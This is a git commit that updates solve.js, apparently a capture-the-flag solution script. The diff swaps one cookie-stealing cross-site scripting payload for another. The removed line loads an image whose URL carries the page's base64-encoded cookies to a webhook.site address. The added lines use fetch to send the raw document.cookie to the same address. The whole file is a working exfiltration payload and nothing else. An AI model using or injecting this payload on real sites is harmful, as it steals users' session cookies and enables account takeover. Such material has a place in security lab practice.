fe26466a9522a562024e6392e7bb50268aae9b90
lildawtha <lildawtha@gmail.com>
2025-07-01 22:21:41 +0630

    Update solve.js

--- solve.js
+++ solve.js
@@ -1,1 +1,2 @@
-x = new Image(); x.src = 'https://webhook.site/a7f46279-8331-4e87-80ba-b993f660bfd6?data='+btoa(document.cookie);
+fetch
+('https://webhook.site/a7f46279-8331-4e87-80ba-b993f660bfd6?c=' + document.cookie)
